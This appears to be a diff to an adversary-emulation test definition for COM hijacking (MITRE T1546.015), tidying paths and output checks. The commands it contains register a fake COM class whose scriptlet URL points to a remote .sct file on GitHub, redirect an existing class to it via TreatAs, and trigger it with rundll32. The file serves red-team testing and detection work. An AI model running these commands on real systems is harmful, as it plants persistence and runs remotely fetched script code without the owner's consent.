@@ -11,7 +11,6 @@
   technique:
     attack_id: T1546.015
     name: 'Event Triggered Execution: Component Object Model Hijacking'
-  privilege: Elevated
   platforms:
     windows:
       psh:
@@ -22,15 +21,15 @@
           reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f;
           reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f;
           reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /T REG_SZ /d "AtomicTest" /f;
-          reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d "C:\WINDOWS\system32\scrobj.dll" /f;
+          reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d "$env:WINDIR\System32\scrobj.dll" /f;
           reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /T REG_SZ /d "Apartment" /f;
           reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID" /ve /T REG_SZ /d "AtomicTest" /f;
           reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /T REG_SZ /d "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct" /f;
           reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID" /ve /T REG_SZ /d "AtomicTest" /f;
           reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f;
           reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f;
-          $null = Start-Process -FilePath "rundll32.exe" -ArgumentList '-sta "AtomicTest"' -PassThru -ErrorAction SilentlyContinue;
-          Write-Host "COM hijacking via TreatAs completed successfully"
+          $proc = Start-Process -FilePath "$env:WINDIR\System32\rundll32.exe" -ArgumentList '-sta "AtomicTest"' -PassThru -ErrorAction SilentlyContinue;
+          if ($proc) { Write-Host "COM hijacking via TreatAs completed successfully" } else { Write-Host "Start-Process did not return a process object" }
         cleanup: |
           reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /f 2>$null;
           reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00" /f 2>$null;
